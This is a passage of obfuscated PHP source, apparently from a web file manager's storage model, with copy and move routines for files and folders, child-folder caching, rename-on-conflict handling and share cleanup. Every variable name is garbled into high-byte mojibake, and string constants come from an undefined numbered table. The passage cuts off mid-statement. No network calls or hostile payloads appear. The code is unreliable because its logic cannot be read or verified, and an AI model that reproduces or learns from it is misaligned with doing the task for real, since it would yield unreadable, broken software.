$ı‚ê­ËŠ = $this->fileHistory($©æĞÉØï, $÷ õ·íë[$Şæ‚ÍåĞ[561]], $÷ õ·íë[$Şæ‚ÍåĞ[89]]); if ($ı‚ê­ËŠ) { $Û‚¡ñ»¡[$Şæ‚ÍåĞ[652]][] = $÷ õ·íë[$Şæ‚ÍåĞ[561]]; } } else { if ($ÍˆÇ‚•œ == REPEAT_SKIP) { } } } Hook::trigger($Şæ‚ÍåĞ[657], array($Şæ‚ÍåĞ[658], $÷ õ·íë, 0)); } return $‚ÄÓÙÃé; } private function _copyCreate($ş¢ùïÄ„, $Öş—¹œù, $İÎğÑ†, &$ñªºà–) { $ï’Ï¿ÎÄ =& $_SERVER[‰‰Ş‚€]; $ñ·şø± = $this->sourceInfoCache($ş¢ùïÄ„); $Ÿúµ´Õè = $this->sourceInfoCache($Öş—¹œù); $éıúïÀé = $this->_makeItemData($ñ·şø±, $Ÿúµ´Õè, $İÎğÑ†); Hook::trigger($ï’Ï¿ÎÄ[659], $éıúïÀé); Hook::trigger($ï’Ï¿ÎÄ[660], array($ï’Ï¿ÎÄ[661], $éıúïÀé, 0)); $™Ã¢ô¶² = $this->add($éıúïÀé); $—«ûıú° = array($ï’Ï¿ÎÄ[202] => $™Ã¢ô¶², $ï’Ï¿ÎÄ[42] => $İÎğÑ†); $this->_copyApplyMeta($—«ûıú°, $ñªºà–); if ($ñ·şø±[$ï’Ï¿ÎÄ[504]] != $ï’Ï¿ÎÄ[101]) { $ñªºà–[$ï’Ï¿ÎÄ[652]][] = $ñ·şø±[$ï’Ï¿ÎÄ[561]]; return $™Ã¢ô¶²; } $’ß¨ÀÁ = array(); $…í÷Œè× = array(); $this->_childrenListAll($ş¢ùïÄ„, $’ß¨ÀÁ); $¿õÕ”ú‡ = count($’ß¨ÀÁ); if ($¿õÕ”ú‡ == 0) { return $™Ã¢ô¶²; } $ÑÏ¨ØŸ— = $this->sourceInfo($™Ã¢ô¶²); foreach ($’ß¨ÀÁ as $€­ëÚ™¯) { $€“ú¡ËÈ = $this->_makeItemData($€­ëÚ™¯, $ÑÏ¨ØŸ—, $€­ëÚ™¯[$ï’Ï¿ÎÄ[42]]); $€“ú¡ËÈ[$ï’Ï¿ÎÄ[604]] = $€­ëÚ™¯[$ï’Ï¿ÎÄ[604]]; $…í÷Œè×[] = $€“ú¡ËÈ; } $this->chunkEventSet($ï’Ï¿ÎÄ[662], array($ï’Ï¿ÎÄ[663], $éıúïÀé, $¿õÕ”ú‡)); $this->addAll($…í÷Œè×, array(), !1); $ÉÊ‚×•Ï = $this->where(array($ï’Ï¿ÎÄ[201] => $™Ã¢ô¶²))->select(); $•œçŞÇÃ = $this->_childrenMakeRelation($’ß¨ÀÁ, $ÉÊ‚×•Ï); $•œçŞÇÃ[$ş¢ùïÄ„] = $™Ã¢ô¶²; $“ØúÛÕÏ = array(); $ßÕ‰Â™û = array(); foreach ($ÉÊ‚×•Ï as $€­ëÚ™¯) { $Ûñ›— = $€­ëÚ™¯[$ï’Ï¿ÎÄ[202]]; $âÜÜ÷Ï¦ = $this->_childrenMatch($•œçŞÇÃ, $€­ëÚ™¯, $ÑÏ¨ØŸ—); $“ØúÛÕÏ[] = array($ï’Ï¿ÎÄ[202], $Ûñ›—, $ï’Ï¿ÎÄ[201], $âÜÜ÷Ï¦[$ï’Ï¿ÎÄ[201]]); $ßÕ‰Â™û[] = array($ï’Ï¿ÎÄ[202], $Ûñ›—, $ï’Ï¿ÎÄ[604], $âÜÜ÷Ï¦[$ï’Ï¿ÎÄ[604]]); $this->_copyApplyMeta($€­ëÚ™¯, $ñªºà–); if ($€­ëÚ™¯[$ï’Ï¿ÎÄ[504]] != $ï’Ï¿ÎÄ[101]) { $ñªºà–[$ï’Ï¿ÎÄ[652]][] = $€­ëÚ™¯[$ï’Ï¿ÎÄ[561]]; } } $this->chunkEventSet($ï’Ï¿ÎÄ[664], array($ï’Ï¿ÎÄ[665], $éıúïÀé, $¿õÕ”ú‡)); $this->saveAll($“ØúÛÕÏ); $this->chunkEventSet($ï’Ï¿ÎÄ[666], array($ï’Ï¿ÎÄ[667], $éıúïÀé, $¿õÕ”ú‡)); $this->saveAll($ßÕ‰Â™û); return $™Ã¢ô¶²; } private function _childrenMakeRelation($—“À“”, $§ÁÛÚ‰) { $‡¨º «ô =& $_SERVER[‰‰Ş‚€]; $Õ¶·Ï¥É = array(); $ø…ûâœÑ = array(); foreach ($—“À“” as $…Ö†±”) { $ÚéÎ‹Æ® = $…Ö†±”[$‡¨º «ô[42]] . $‡¨º «ô[18] . $…Ö†±”[$‡¨º «ô[604]]; $Õ¶·Ï¥É[$ÚéÎ‹Æ®] = $…Ö†±”[$‡¨º «ô[202]]; } foreach ($§ÁÛÚ‰ as $…Ö†±”) { $ÚéÎ‹Æ® = $…Ö†±”[$‡¨º «ô[42]] . $‡¨º «ô[18] . $…Ö†±”[$‡¨º «ô[604]]; $‡Š©–Œª = $Õ¶·Ï¥É[$ÚéÎ‹Æ®]; $ø…ûâœÑ[$‡Š©–Œª] = $…Ö†±”[$‡¨º «ô[202]]; } return $ø…ûâœÑ; } private function _childrenMatch($ïò˜üÈ, $ßÕºÀ, $±”È–ˆ) { $¶ªŞª =& $_SERVER[‰‰Ş‚€]; $ş¿ğÙŒ¸ = $±”È–ˆ[$¶ªŞª[604]]; $Áã¤×Ç¾ = $this->parentLevelArray($ßÕºÀ[$¶ªŞª[604]]); foreach ($Áã¤×Ç¾ as $–éœë”Ç) { if (isset($ïò˜üÈ[$–éœë”Ç])) { $ş¿ğÙŒ¸ .= $ïò˜üÈ[$–éœë”Ç] . $¶ªŞª[668]; } } $ş¿ğÙŒ¸ = rtrim($ş¿ğÙŒ¸, $¶ªŞª[60]) . $¶ªŞª[60]; $»§ù±±ú = $this->parentLevelArray($ş¿ğÙŒ¸); $³ÒÄØ£¨ = $»§ù±±ú[count($»§ù±±ú) - 1]; return array($¶ªŞª[201] => $³ÒÄØ£¨, $¶ªŞª[604] => $ş¿ğÙŒ¸); } private function _makeItemData($½´ƒì×, $¬¢ı‰‡Ê, $ß¸ŠØ¿¹) { $éëºİÇµ =& $_SERVER[‰‰Ş‚€]; $ìÀë»…Ÿ = array($éëºİÇµ[669] => $½´ƒì×[$éëºİÇµ[504]], $éëºİÇµ[513] => $ß¸ŠØ¿¹, $éëºİÇµ[670] => $½´ƒì×[$éëºİÇµ[505]] ? $½´ƒì×[$éëºİÇµ[505]] : $éëºİÇµ[22], $éëºİÇµ[562] => $½´ƒì×[$éëºİÇµ[561]] ? $½´ƒì×[$éëºİÇµ[561]] : 0, $éëºİÇµ[640] => $½´ƒì×[$éëºİÇµ[89]] ? $½´ƒì×[$éëºİÇµ[89]] : 0, $éëºİÇµ[671] => intval($¬¢ı‰‡Ê[$éëºİÇµ[199]]), $éëºİÇµ[672] => intval($¬¢ı‰‡Ê[$éëºİÇµ[589]]), $éëºİÇµ[673] => intval(USER_ID), $éëºİÇµ[674] => intval(USER_ID), $éëºİÇµ[496] => intval($¬¢ı‰‡Ê[$éëºİÇµ[202]]), $éëºİÇµ[675] => $¬¢ı‰‡Ê[$éëºİÇµ[604]] . $¬¢ı‰‡Ê[$éëºİÇµ[202]] . $éëºİÇµ[60], $éëºİÇµ[517] => $½´ƒì×[$éëºİÇµ[98]] ? $½´ƒì×[$éëºİÇµ[98]] : time(), $éëºİÇµ[523] => 0, $éëºİÇµ[676] => $éëºİÇµ[22]); return $ìÀë»…Ÿ; } private function _copyApplyMeta($”Ø”€, &$‹ŒƒÚŸ) { $È‚Üóê… =& $_SERVER[‰‰Ş‚€]; $ ¸ÏÆÎ = $”Ø”€[$È‚Üóê…[202]]; $Ø°Öãæá = $”Ø”€[$È‚Üóê…[42]]; if (!isset($”Ø”€[$È‚Üóê…[677]]) || !$”Ø”€[$È‚Üóê…[677]] || $”Ø”€[$È‚Üóê…[677]] == $È‚Üóê…[239]) { $‹ŒƒÚŸ[$È‚Üóê…[654]][] = array($È‚Üóê…[202], $ ¸ÏÆÎ, $È‚Üóê…[677], short_id($ ¸ÏÆÎ)); } if (Input::check($Ø°Öãæá, $È‚Üóê…[678])) { $‹ŒƒÚŸ[$È‚Üóê…[653]][] = array($È‚Üóê…[202] => $ ¸ÏÆÎ, $È‚Üóê…[105] => $È‚Üóê…[556], $È‚Üóê…[459] => str_replace($È‚Üóê…[63], $È‚Üóê…[22], Pinyin::get($Ø°Öãæá))); $‹ŒƒÚŸ[$È‚Üóê…[653]][] = array($È‚Üóê…[202] => $ ¸ÏÆÎ, $È‚Üóê…[105] => $È‚Üóê…[555], $È‚Üóê…[459] => Pinyin::get($Ø°Öãæá, $È‚Üóê…[679])); } $‹ŒƒÚŸ[$È‚Üóê…[653]][] = array($È‚Üóê…[202] => $ ¸ÏÆÎ, $È‚Üóê…[105] => $È‚Üóê…[535], $È‚Üóê…[459] => KodSort::makeStr($Ø°Öãæá)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÅôÊ³¸) { $à¤Í‡Ê¨ =& $_SERVER[‰‰Ş‚€]; $ˆÃüŠÊ™ = $this->sourceInfo($ÅôÊ³¸); $Ä¨¥Ø¿è = $à¤Í‡Ê¨[680]; $…Şê£ş§ = array($à¤Í‡Ê¨[604] => array($à¤Í‡Ê¨[635], $ˆÃüŠÊ™[$à¤Í‡Ê¨[604]] . $ÅôÊ³¸ . $à¤Í‡Ê¨[636]), $à¤Í‡Ê¨[524] => $this->targetIsDelete); $‡Ôñ‡š = $this->field($Ä¨¥Ø¿è)->where($…Şê£ş§)->select(); if (!$‡Ôñ‡š) { return; } $‡Ôñ‡š = array_to_keyvalue($‡Ôñ‡š, $à¤Í‡Ê¨[202]); foreach ($‡Ôñ‡š as $ñûáŠ€Í) { $†‘Ä”êê = $ñûáŠ€Í[$à¤Í‡Ê¨[201]]; $ÅôÊ³¸ = $ñûáŠ€Í[$à¤Í‡Ê¨[202]]; if (!isset($this->_childrenListCache[$ÅôÊ³¸]) && $ñûáŠ€Í[$à¤Í‡Ê¨[504]] == $à¤Í‡Ê¨[101]) { $this->_childrenListCache[$ÅôÊ³¸] = array(); } if (!isset($this->_childrenListCache[$†‘Ä”êê])) { $this->_childrenListCache[$†‘Ä”êê] = array(); } $this->_childrenListCache[$†‘Ä”êê][$ÅôÊ³¸] = $ñûáŠ€Í; $this->_childrenItemCache[$ÅôÊ³¸] = $ñûáŠ€Í; } } private function _childrenListAll($İ˜€Î, &$ÊîÙèÏù) { $Ùº¦ƒÚŸ =& $_SERVER[‰‰Ş‚€]; if (!isset($this->_childrenListCache[$İ˜€Î])) { return; } $¶î¶úå¦ = $this->_childrenListCache[$İ˜€Î]; foreach ($¶î¶úå¦ as $„øò¾±î => $ÜÙ‡¾¨Ù) { $ÊîÙèÏù[$„øò¾±î] = $ÜÙ‡¾¨Ù; if ($ÜÙ‡¾¨Ù[$Ùº¦ƒÚŸ[504]] == $Ùº¦ƒÚŸ[101]) { $this->_childrenListAll($„øò¾±î, $ÊîÙèÏù); } } } private function sourceInfoCache($¸ö½Ã‰†) { if (isset($this->_childrenItemCache[$¸ö½Ã‰†])) { return $this->_childrenItemCache[$¸ö½Ã‰†]; } return $this->sourceInfo($¸ö½Ã‰†); } private function _childrenList($”­ß”äë) { if (isset($this->_childrenListCache[$”­ß”äë])) { return $this->_childrenListCache[$”­ß”äë]; } return $this->_childrenListSelect($”­ß”äë); } private function _childrenListSelect($¥÷ñÌµò) { $•õùˆ¿• =& $_SERVER[‰‰Ş‚€]; $‚ËÙ†İÎ = array($•õùˆ¿•[201] => $¥÷ñÌµò, $•õùˆ¿•[524] => $this->targetIsDelete); $Õ•ÀŸ¸¨ = $this->where($‚ËÙ†İÎ)->select(); $Õ•ÀŸ¸¨ = $Õ•ÀŸ¸¨ ? $Õ•ÀŸ¸¨ : array(); $çğÚË– = array_to_keyvalue($Õ•ÀŸ¸¨, $•õùˆ¿•[202]); $this->_childrenListCache[$¥÷ñÌµò] = $çğÚË–; foreach ($çğÚË– as $¥÷ñÌµò => $­‰åİØ¸) { $this->_childrenItemCache[$¥÷ñÌµò] = $­‰åİØ¸; } return $çğÚË–; } private function fileNameExistAuto($µäƒöÚı, $ÚáÛŠïˆ) { $™úúşîÈ =& $_SERVER[‰‰Ş‚€]; if ($ÚáÛŠïˆ[$™úúşîÈ[524]] == $™úúşîÈ[101]) { return $this->fileNameExist($µäƒöÚı, $ÚáÛŠïˆ[$™úúşîÈ[42]]); } return $this->fileNameExistCache($µäƒöÚı, $ÚáÛŠïˆ[$™úúşîÈ[42]]); } private function fileNameExistCache($Åº‘»Š, $òÒğĞ²’) { $à“Êü–£ =& $_SERVER[‰‰Ş‚€]; $òÒğĞ²’ = strtolower($òÒğĞ²’); $‰ÒƒºÈ„ = $this->_childrenList($Åº‘»Š); foreach ($‰ÒƒºÈ„ as $Ù¸–»·) { if ($òÒğĞ²’ == strtolower($Ù¸–»·[$à“Êü–£[42]])) { return $Ù¸–»·[$à“Êü–£[202]]; } } return !1; } private function fileNameAutoCache($Ó—œ˜¨, $ç¡ªÃ½Î, $ñîù É, $¾¤ªïºº) { $ñ›½ á½ =& $_SERVER[‰‰Ş‚€]; $÷ Ä¼ø´ = $this->_childrenList($Ó—œ˜¨); $¡ßş®£ = array_to_keyvalue($÷ Ä¼ø´, $ñ›½ á½[22], $ñ›½ á½[42]); return $this->fileNameAutoGet($¡ßş®£, $ç¡ªÃ½Î, $ñîù É, $¾¤ªïºº); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ğöÁŞè­, $¿ØÊ…î, $ô»µõç = REPEAT_REPLACE, $†‰¯Èü° = '') { $×ê±°êÌ =& $_SERVER[‰‰Ş‚€]; $¼¯ÆÓ€à = $this->sourceInfo($ğöÁŞè­); $×úíÎ²— = $this->sourceInfo($¿ØÊ…î); if ($¼¯ÆÓ€à[$×ê±°êÌ[201]] == $×úíÎ²—[$×ê±°êÌ[202]]) { if ($¼¯ÆÓ€à[$×ê±°êÌ[524]] == $×ê±°êÌ[101]) { Model($×ê±°êÌ[522])->restore(array($ğöÁŞè­)); } if (!$†‰¯Èü° || $†‰¯Èü° == $¼¯ÆÓ€à[$×ê±°êÌ[42]]) { return $ğöÁŞè­; } } $ì§‰« = $this->pathInfoMore($ğöÁŞè­); if ($this->isParentOf($ğöÁŞè­, $¿ØÊ…î)) { return !1; } if (!$¼¯ÆÓ€à || !$×úíÎ²— || $×úíÎ²—[$×ê±°êÌ[504]] != $×ê±°êÌ[101]) { return !1; } Hook::trigger($×ê±°êÌ[681], $ì§‰«); $this->targetIsDelete = intval($¼¯ÆÓ€à[$×ê±°êÌ[524]]); if ($¼¯ÆÓ€à[$×ê±°êÌ[201]] == $¿ØÊ…î && $†‰¯Èü° != $¼¯ÆÓ€à[$×ê±°êÌ[42]]) { $ïù”ˆ­ˆ = $this->fileNameExist($¿ØÊ…î, $†‰¯Èü°); if ($ïù”ˆ­ˆ && $¼¯ÆÓ€à[$×ê±°êÌ[504]] == $×ê±°êÌ[239]) { $Úéíæ‘Ğ = $this->sourceInfo($ïù”ˆ­ˆ); $ÓŒø™Öå = $this->fileHistory($Úéíæ‘Ğ, $¼¯ÆÓ€à[$×ê±°êÌ[561]], $¼¯ÆÓ€à[$×ê±°êÌ[89]]); if (!$ÓŒø™Öå) { Model($×ê±°êÌ[564])->remove($¼¯ÆÓ€à[$×ê±°êÌ[561]]); } $this->removeNow($ğöÁŞè­, !1); $this->folderSizeReset($¿ØÊ…î); Hook::trigger($×ê±°êÌ[682], $ì§‰«); return $ïù”ˆ­ˆ; } } $ê‡®‰Ó = $†‰¯Èü° ? $†‰¯Èü° : $¼¯ÆÓ€à[$×ê±°êÌ[42]]; $this->lockMoveStart($ğöÁŞè­); $this->lockWriteStart($¿ØÊ…î, $ê‡®‰Ó); $µ¨çÌè£ = array($×ê±°êÌ[652] => array(), $×ê±°êÌ[683] => !1); $this->clearShare($ğöÁŞè­, $¿ØÊ…î); $å²×òğµ = $this->fileNameExistAuto($¿ØÊ…î, $¼¯ÆÓ€à); $§€•‚“ = $this->_move($ğöÁŞè­, $¿ØÊ…î, $ô»µõç, $µ¨çÌè£, $†‰¯Èü°); $this->sourceCacheClear(); if ($¼¯ÆÓ€à[$×ê±°êÌ[504]] == $×ê±°êÌ[101] && $å²×òğµ) { $this->folderSizeResetChildren($§€•‚“); } Model($×ê±°êÌ[241])->linkAdd($µ¨çÌè£[$×ê±°êÌ[652]]); if ($§€•‚“ && $å²×òğµ && $µ¨çÌè£[$×ê±°êÌ[683]]) { $àëÅõ–Ó = $¼¯ÆÓ€à[$×ê±°êÌ[504]] == $×ê±°êÌ[101] ? $this->_childrenListSelect($ğöÁŞè­) : !1; $ÅÅâù¼ó = $àëÅõ–Ó && count($àëÅõ–Ó) > 0 ? !0 : !1; $this->removeNow($ğöÁŞè­, $ÅÅâù¼ó); } $this->lockMoveEnd($ğöÁŞè­); $this->lockWriteEnd($¿ØÊ…î, $ê‡®‰Ó); $this->folderSizeReset($¼¯ÆÓ€à[$×ê±°êÌ[201]]); $this->folderSizeReset($¿ØÊ…î); $Ë¾¼…ÜÜ = array($¼¯ÆÓ€à[$×ê±°êÌ[201]], $¿ØÊ…î); if ($¼¯ÆÓ€à[$×ê±°êÌ[504]] == $×ê±°êÌ[101]) { $Ë¾¼…ÜÜ[] = $ğöÁŞè­; } $this->updateModifyTime($Ë¾¼…ÜÜ); Model($×ê±°êÌ[656])->eventMove($ğöÁŞè­, $¼¯ÆÓ€à[$×ê±°êÌ[201]], $¿ØÊ…î); Hook::trigger($×ê±°êÌ[682], $ì§‰«); return $§€•‚“; } private function _move($Òé åÌŠ, $‰à²‰‘, $äªûÓ§, &$ÛöÓú¢§, $óè¾Ï = '') { $˜ËÏµ‹¬ =& $_SERVER[‰‰Ş‚€]; $‹Öµ¨´¦ = $this->sourceInfo($Òé åÌŠ); $É½¾ç‰Ê = $‹Öµ¨´¦[$˜ËÏµ‹¬[504]] == $˜ËÏµ‹¬[101]; $‚©Êá– = $óè¾Ï ? $óè¾Ï : $‹Öµ¨´¦[$˜ËÏµ‹¬[42]]; $Ã÷àÏœ¡ = $this->fileNameExistAuto($‰à²‰‘, $‹Öµ¨´¦); $this->lockMoveStart($Òé åÌŠ); $this->lockWriteStart($‰à²‰‘, $‚©Êá–); if (!$Ã÷àÏœ¡) { return $this->_moveForce($Òé åÌŠ, $‰à²‰‘, $‚©Êá–); } $ş‰¢ê = $Ã÷àÏœ¡; $‡ïªÎğË = !1; if ($É½¾ç‰Ê) { if ($äªûÓ§ == REPEAT_RENAME_FOLDER) { $‚©Êá– = $this->fileNameAuto($‰à²‰‘, $‚©Êá–, $äªûÓ§, $É½¾ç‰Ê); $ş‰¢ê = $this->_moveForce($Òé åÌŠ, $‰à²‰‘, $‚©Êá–); } else { $Ñˆ¶ôÈ‡ = $this->_childrenListSelect($Òé åÌŠ); foreach ($Ñˆ¶ôÈ‡ as $ÏÛ²¥÷—) { $ÉĞ¦¿™ = REPEAT_REPLACE; $this->_move($ÏÛ²¥÷—[$˜ËÏµ‹¬[202]], $Ã÷àÏœ¡, $ÉĞ¦¿™, $ÛöÓú¢§); } $‡ïªÎğË = !0; } } else { if ($äªûÓ§ == REPEAT_RENAME || $äªûÓ§ == REPEAT_RENAME_FOLDER) { $‚©Êá– = $this->fileNameAuto($‰à²‰‘, $‚©Êá–, $äªûÓ§, $É½¾ç‰Ê); $ş‰¢ê = $this->_moveForce($Òé åÌŠ, $‰à²‰‘, $‚©Êá–); } else { $â±½†ó‚ = $this->sourceInfoCache($Ã÷àÏœ¡); $‹¨Š™ = $this->fileHistory($â±½†ó‚, $‹Öµ¨´¦[$˜ËÏµ‹¬[561]], $‹Öµ¨´¦[$˜ËÏµ‹¬[89]]); if ($‹¨Š™) { $ÛöÓú¢§[$˜ËÏµ‹¬[652]][] = $‹Öµ¨´¦[$˜ËÏµ‹¬[561]]; } $‡ïªÎğË = !0; } } if ($‡ïªÎğË) { $ÛöÓú¢§[$˜ËÏµ‹¬[683]] = !0; } return $ş‰¢ê; } private function _moveForce($½Ş‡ğØŸ, $Õ­şËü€, $å¾¹ä¤´) { $›Ìœã–ç =& $_SERVER[‰‰Ş‚€]; $óï¿õî = $this->sourceInfo($½Ş‡ğØŸ); $€ÛâíàÉ = $this->sourceInfo($Õ­şËü€); $—âøÚ‡ = $óï¿õî[$›Ìœã–ç[504]] == $›Ìœã–ç[101]; $Šîş´‚³ = array($›Ìœã–ç[496] => $€ÛâíàÉ[$›Ìœã–ç[202]], $›Ìœã–ç[675] => $€ÛâíàÉ[$›Ìœã–ç[604]] . $€ÛâíàÉ[$›Ìœã–ç[202]] . $›Ìœã–ç[60], $›Ìœã–ç[671] => $€ÛâíàÉ[$›Ìœã–ç[199]], $›Ìœã–ç[672] => $€ÛâíàÉ[$›Ìœã–ç[589]], $›Ìœã–ç[674] => USER_ID, $›Ìœã–ç[513] => $å¾¹ä¤´); $Üş’Ô¹‘ = $óï¿õî[$›Ìœã–ç[199]] == SourceModel::TYPE_GROUP && $€ÛâíàÉ[$›Ìœã–ç[199]] == SourceModel::TYPE_GROUP && $óï¿õî[$›Ìœã–ç[589]] == $€ÛâíàÉ[$›Ìœã–ç[589]]; if (!$Üş’Ô¹‘ && $this->moveClearAuth) { Model($›Ìœã–ç[587])->authClear($½Ş‡ğØŸ); } $›Ñú”·ò = $óï¿õî[$›Ìœã–ç[524]] == $›Ìœã–ç[101] && $€ÛâíàÉ[$›Ìœã–ç[524]] != $›Ìœã–ç[101]; if ($›Ñú”·ò) { $Šîş´‚³[$›Ìœã–ç[523]] = 0; } if ($—âøÚ‡) { $ª»Ç…ó = array($›Ìœã–ç[675] => array($›Ìœã–ç[635], $óï¿õî[$›Ìœã–ç[604]] . $óï¿õî[$›Ìœã–ç[202]] . $›Ìœã–ç[636])); $–ô„¡ÓÎ = $óï¿õî[$›Ìœã–ç[604]] . $óï¿õî[$›Ìœã–ç[202]] . $›Ìœã–ç[60]; $ì‹Ô¹ù = $€ÛâíàÉ[$›Ìœã–ç[604]] . $€ÛâíàÉ[$›Ìœã–ç[202]] . $›Ìœã–ç[60] . $óï¿õî[$›Ìœã–ç[202]] . $›Ìœã–ç[60]; $—±éÍê— = array($›Ìœã–ç[675] => array($›Ìœã–ç[684], "\162\x65\x70\154\141\x63\145\50\160\141\x72\145\156\x74\114\145\x76\145\x6c\54\47{$–ô„¡ÓÎ}\47\x2c\x27{$ì‹Ô¹ù}\47\51"), $›Ìœã–ç[671] => $€ÛâíàÉ[$›Ìœã–ç[199]], $›Ìœã–ç[672] => $€ÛâíàÉ[$›Ìœã–ç[589]]); if ($›Ñú”·ò) { $—±éÍê—[$›Ìœã–ç[523]] = 0; } $this->where($ª»Ç…ó)->data($—±éÍê—)->save(); } $this->where(array($›Ìœã–ç[510] => $½Ş‡ğØŸ))->data($Šîş´‚³)->save(); return $½Ş‡ğØŸ; } private function clearShare($ĞÃÚø±Â, $×¡ñ—ôĞ) { $¥¢Úï£º =& $_SERVER[‰‰Ş‚€]; $üú²†ùñ = $this->sourceInfo($ĞÃÚø±Â); $¦÷¸š¤Û = $this->sourceInfo($×¡ñ—ôĞ); if ($üú²†ùñ[$¥¢Úï£º[589]] == $¦÷¸š¤Û[$¥¢Úï£º[589]] && $üú²†ùñ[$¥¢Úï£º[199]] == $¥¢Úï£º[685]) { return; } $°‘²ª¾‘ = array($¥¢Úï£º[604] => array($¥¢Úï£º[635], $üú²†ùñ[$¥¢Úï£º[604]] . $ĞÃÚø±Â . $¥¢Úï£º[636])); $Â¾™íæã = $this->field($¥¢Úï£º[510])->where($°‘²ª¾‘)->getField($¥¢Úï£º[202], !0); if (!$Â¾™íæã) { return; } $°‘²ª¾‘ = array($¥¢Úï£º[202] => array($¥¢Úï£º[17], $Â¾™íæã), $¥¢Úï£º[686] => 1); $ùœÓîæ = Model($¥¢Úï£º[687])->field($¥¢Úï£º[688])->where($°‘²ª¾‘)->select(); if (!$ùœÓîæ) { return; } $ùœÓîæ = array_to_keyvalue($ùœÓîæ, $¥¢Úï£º[22], $¥¢Úï£º[688]); $°‘²ª¾‘ = array($¥¢Úï£º[688] => array($¥¢Úï£º[17], $ùœÓîæ)); Model($¥¢Úï£º[687])->where($°‘²ª¾‘)->save(array($¥¢Úï£º[686] => 0)); Model($¥¢Úï£º[689])->where($°‘²ª¾‘)->delete(); } public function copyFolderFromIO($é¬¿ñ, $‡òŞéŞ‡, $´ÜñÖÅŸ, $€ìÑƒ²ı, $šîÛÂêÂ, $©ÔÌÇõô = false) { $ßÕú°Á¥ =& $_SERVER[‰‰Ş‚€]; $ß¨™Ûú = array($ßÕú°Á¥[653] => array(), $ßÕú°Á¥[654] => array(), $ßÕú°Á¥[652] => array(), $ßÕú°Á¥[690] => array()); $‹ıÌ»Ú¬ = $©ÔÌÇõô ? $©ÔÌÇõô : $é¬¿ñ->pathThis($‡òŞéŞ‡); $–«€­ŸÌ = $this->fileNameExist($´ÜñÖÅŸ, $‹ıÌ»Ú¬); $Õ”µÒ¸¸ = $this->mkdir($´ÜñÖÅŸ, $‹ıÌ»Ú¬, $€ìÑƒ²ı); if (!$–«€­ŸÌ || $€ìÑƒ²ı == REPEAT_RENAME_FOLDER) { $€ìÑƒ²ı = !1; } if ($–«€­ŸÌ) { $this->_childrenAllMake($–«€­ŸÌ); } Hook::trigger($ßÕú°Á¥[691]); $–¢İ¤ = KodIO::ioFileDriverGet($ßÕú°Á¥[502] . $´ÜñÖÅŸ . $ßÕú°Á¥[411]); $this->_copyChildTo($é¬¿ñ, $‡òŞéŞ‡, $Õ”µÒ¸¸, $€ìÑƒ²ı, $ß¨™Ûú, $šîÛÂêÂ, $–¢İ¤); Hook::trigger($ßÕú°Á¥[692]); if ($Õ”µÒ¸¸) { $this->folderSizeResetChildren($Õ”µÒ¸¸); } $this->_childrenListClear(); Model($ßÕú°Á¥[655])->addAll($ß¨™Ûú[$ßÕú°Á¥[653]], array(), !0); Model($ßÕú°Á¥[656])->eventCopy($Õ”µÒ¸¸); $this->saveAll($ß¨™Ûú[$ßÕú°Á¥[654]]); Model($ßÕú°Á¥[564])->linkAdd($ß¨™Ûú[$ßÕú°Á¥[652]]); Model($ßÕú°Á¥[564])->remove($ß¨™Ûú[$ßÕú°Á¥[690]]); $this->folderSizeReset($´ÜñÖÅŸ); $this->updateModifyTime($´ÜñÖÅŸ); return $Õ”µÒ¸¸; } private function _copyChildTo($°¹¡‹ş¢, $²¯ÖØ©‡, $ïÈÖ´¸È, $«•’ÉáÆ, &$°šŸúí½, $ Àƒ½â­, $şúı ‹) { $·ÚĞñÚÒ =& $_SERVER[‰‰Ş‚€]; $İ«¼÷‘ = $this->sourceInfoCache($ïÈÖ´¸È); $§×ó×å¡ = $°¹¡‹ş¢->listPath($²¯ÖØ©‡); $§×ó×å¡ = $§×ó×å¡ ? $§×ó×å¡ : array($·ÚĞñÚÒ[96] => array(), $·ÚĞñÚÒ[95] => array()); $”ã£›Ñ´ = array_merge($§×ó×å¡[$·ÚĞñÚÒ[96]], $§×ó×å¡[$·ÚĞñÚÒ[95]]); $ƒ¥”ü« = $this->_addFiles($°¹¡‹ş¢, $şúı ‹, $§×ó×å¡[$·ÚĞñÚÒ[96]], $ Àƒ½â­); $İŸöŸÕê = array(); foreach ($”ã£›Ñ´ as &$ß­ªß…è) { if (isset($ƒ¥”ü«[$ß­ªß…è[$·ÚĞñÚÒ[42]]])) { $ß­ªß…è = $ƒ¥”ü«[$ß­ªß…è[$·ÚĞñÚÒ[42]]]; } $ß­ªß…è[$·ÚĞñÚÒ[504]] = $ß­ªß…è[$·ÚĞñÚÒ[43]] == $·ÚĞñÚÒ[88]; $ß­ªß…è[$·ÚĞñÚÒ[505]] = substr(_get($ß­ªß…è, $·ÚĞñÚÒ[177], $·ÚĞñÚÒ[22]), 0, 10); $ß­ªß…è[$·ÚĞñÚÒ[89]] = _get($ß­ªß…è, $·ÚĞñÚÒ[89], 0); $ß­ªß…è[$·ÚĞñÚÒ[561]] = _get($ß­ªß…è, $·ÚĞñÚÒ[561], 0); if (!isset($ß­ªß…è[$·ÚĞñÚÒ[693]]) && $ß­ªß…è[$·ÚĞñÚÒ[561]]) { $°šŸúí½[$·ÚĞñÚÒ[690]][] = $ß­ªß…è[$·ÚĞñÚÒ[561]]; } if ($«•’ÉáÆ) { $²éìêƒç = $this->fileNameExistCache($ïÈÖ´¸È, $ß­ªß…è[$·ÚĞñÚÒ[42]]); if ($²éìêƒç) { if ($ß­ªß…è[$·ÚĞñÚÒ[504]] || $«•’ÉáÆ == REPEAT_SKIP) { continue; } if ($«•’ÉáÆ == REPEAT_REPLACE) { $úóŒı—Ã = $this->sourceInfoCache($²éìêƒç); $éÃÇ…åï = $this->fileHistory($úóŒı—Ã, $ß­ªß…è[$·ÚĞñÚÒ[561]], $ß­ªß…è[$·ÚĞñÚÒ[89]]); if ($éÃÇ…åï) { $°šŸúí½[$·ÚĞñÚÒ[652]][] = $ß­ªß…è[$·ÚĞñÚÒ[561]]; } continue; } else { if ($«•’ÉáÆ == REPEAT_RENAME) { $ß­ªß…è[$·ÚĞñÚÒ[42]] = $this->fileNameAutoCache($ïÈÖ´¸È, $ß­ªß…è[$·ÚĞñÚÒ[42]], $«•’ÉáÆ, !1); } } } } if (!$ß­ªß…è[$·ÚĞñÚÒ[504]] && $ß­ªß…è[$·ÚĞñÚÒ[561]] == 0) { continue; } if (!$ß­ªß…è[$·ÚĞñÚÒ[504]] && $ß­ªß…è[$·ÚĞñÚÒ[561]]) { 